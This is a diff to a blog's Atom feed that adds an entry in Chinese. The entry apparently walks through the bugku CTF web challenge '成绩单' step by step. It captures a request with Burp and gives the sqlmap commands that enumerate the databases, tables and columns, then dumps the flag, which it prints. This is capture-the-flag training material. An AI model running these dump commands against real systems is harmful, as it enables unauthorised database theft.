@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-02-02T15:32:48.486Z</updated>
+  <updated>2020-02-03T13:03:06.254Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>bugku-web-成绩单</title>
+    <link href="http://yoursite.com/2020/02/03/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/"/>
+    <id>http://yoursite.com/2020/02/03/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/</id>
+    <published>2020-02-03T12:00:28.000Z</published>
+    <updated>2020-02-03T13:03:06.254Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://ctf.bugku.com" target="_blank" rel="noopener">bugku平台</a></p><p>原题地址:<a href="http://123.206.87.240:8002/chengjidan/" target="_blank" rel="noopener">http://123.206.87.240:8002/chengjidan/</a></p><a id="more"></a><p><img src="/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/%E6%88%90%E7%BB%A9%E5%8D%95-1.jpg" alt="alt"></p><p>も一度~</p><p><img src="/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/%E6%88%90%E7%BB%A9%E5%8D%95-2.jpg" alt="alt"></p><p>随便输几个试试</p><p><img src="/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/%E6%88%90%E7%BB%A9%E5%8D%95-3.jpg" alt="alt"></p><p><img src="/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/%E6%88%90%E7%BB%A9%E5%8D%95-4.jpg" alt="alt"></p><p>应该是SQL注入</p><p>先用burp抓个包</p><p><img src="/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/%E6%88%90%E7%BB%A9%E5%8D%95-5.jpg" alt="alt"></p><p>保存到本地文件后，使用sqlmap工具爆库</p><p>先输入</p><p><code>sqlmap.py -r &quot;D:\1.txt&quot; -id --dbs</code></p><p> -r是读文件,引号内是刚刚数据包保存文件的路径，-p是参数名，可以在数据包中看到， –dbs意思是想获取数据库名字 </p><p><img src="/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/%E6%88%90%E7%BB%A9%E5%8D%95-6.jpg" alt="alt"></p><p>出来两个库</p><p><img src="/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/%E6%88%90%E7%BB%A9%E5%8D%95-7.jpg" alt="alt"></p><p>再输入<code>sqlmap.py -r &quot;D:\1.txt&quot; -D skctf_flag -p id --tables</code>获取表名</p><p>得到两个表</p><p><img src="/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/%E6%88%90%E7%BB%A9%E5%8D%95-8.jpg" alt="alt"></p><p>再输入<code>sqlmap.py -r &quot;D:\1.txt&quot; -D skctf_flag -T fl4g -p id --columns</code>获取列名</p><p><img src="/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/%E6%88%90%E7%BB%A9%E5%8D%95-9.jpg" alt="alt"></p><p>再输入<code>sqlmap.py -r &quot;D:\1.txt&quot; -D skctf_flag -T fl4g -C skctf_flag -p id --dump</code>得到flag</p><p><img src="/bugku-web-%E6%88%90%E7%BB%A9%E5%8D%95/%E6%88%90%E7%BB%A9%E5%8D%95-10.jpg" alt="alt"></p><p>BUGKU{Sql_INJECT0N_4813drd8hz4}</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://ctf.bugku.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;bugku平台&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;原题地址:&lt;a href=&quot;http://123.206.87.240:8002/chengjidan/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://123.206.87.240:8002/chengjidan/&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>bugku-web-输入密码查看flag</title>
